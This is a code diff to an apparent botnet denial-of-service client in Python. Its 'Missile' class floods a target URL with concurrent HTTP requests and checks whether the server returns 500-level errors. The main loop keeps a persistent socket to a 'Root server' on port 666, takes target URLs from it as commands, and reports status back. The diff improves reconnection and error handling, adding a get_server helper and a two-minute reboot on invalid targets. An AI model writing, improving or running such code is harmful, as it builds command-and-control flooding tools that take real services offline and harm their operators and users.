@@ -5,6 +5,7 @@ import aiohttp
 import random
 import string
 import socket
+import time
 
 
 class Missile():
@@ -89,7 +90,10 @@ class Missile():
         )
 
     async def _launch(self):
-        self.count += 1
+        try:
+            self.count += 1
+        except AttributeError:
+            return -2
         print(
             f"Launching attack no. {self.count} on {self.url.split('?')[0]}."
         )
@@ -137,7 +141,8 @@ class Missile():
                 else:
                     print(f"Unknown status code detected.\n{status}\n{reason}")
             return status
-        except aiohttp.client_exceptions.ClientConnectorError:
+        except aiohttp.client_exceptions.ClientConnectorError as e:
+            print(str(e))
             return -1
 
     async def attack(self, count):
@@ -146,6 +151,8 @@ class Missile():
             for i in range(count)
         ]
         status_list = list(set(await asyncio.gather(*tasks)))
+        if status_list == [-2]:
+            return -2
         if all([
             status < 500
             for status in status_list
@@ -154,7 +161,6 @@ class Missile():
                 f"Finished Performing {self.count} attacks "
                 "but the target is still intact..."
             )
-        await self.sess.close()
         try:
             self.root.sendall(str(status_list).encode())
             return 0
@@ -163,6 +169,7 @@ class Missile():
             ConnectionAbortedError,
             ConnectionError
         ):
+            await self.sess.close()
             return -1
 
 if __name__ == "__main__":
@@ -180,6 +187,24 @@ if __name__ == "__main__":
             pad.append('│ ' + (line + ' ' * hor)[:hor - 1] + '│')
         pad.append('└' + '─' * hor + '┘')
         return '\n'.join(pad)
+
+    def get_server():
+        root = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        root_ip = "localhost"
+        if len(sys.argv) > 1:
+            root_ip = sys.argv[1]
+        print("Trying to establish connection with Root server.")
+        while True:  # Persistent Connection
+            try:
+                root.connect((root_ip, 666))
+                print(f"Connected to {root_ip}:{666}!")
+                return root
+            except (
+                ConnectionRefusedError,
+                ConnectionAbortedError,
+                ConnectionError
+            ):
+                continue
 
     if "help" in [arg.lower() for arg in sys.argv]:
         print(
@@ -199,22 +224,7 @@ if __name__ == "__main__":
         )
     )
 
-    root = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    root_ip = "localhost"
-    if len(sys.argv) > 1:
-        root_ip = sys.argv[1]
-    print("Trying to establish connection with Root server.")
-    while True:  # Persistent Connection
-        try:
-            root.connect((root_ip, 666))
-            print(f"Connected to {root_ip}:666!")
-            break
-        except (
-            ConnectionRefusedError,
-            ConnectionAbortedError,
-            ConnectionError
-        ):
-            continue
+    root = get_server()
     root.sendall("Requesting Target.".encode())
     while True:
         command = root.recv(1024)  # Target
@@ -224,6 +234,14 @@ if __name__ == "__main__":
             root.close()
             sys.exit(0)
         root_status = asyncio.run(main(root, target))
-        if root_status < 0:
+        if root_status == -1:
             print("Root server is down. Quiting.")
             sys.exit(0)
+        elif root_status == -2:
+            print(
+                "Received an invalid url from Server.\n"
+                "Notified server and rebooting in 2 minutes.\n"
+            )
+            time.sleep(120)
+            root = get_server()
+            root.sendall("Requesting Target.".encode())
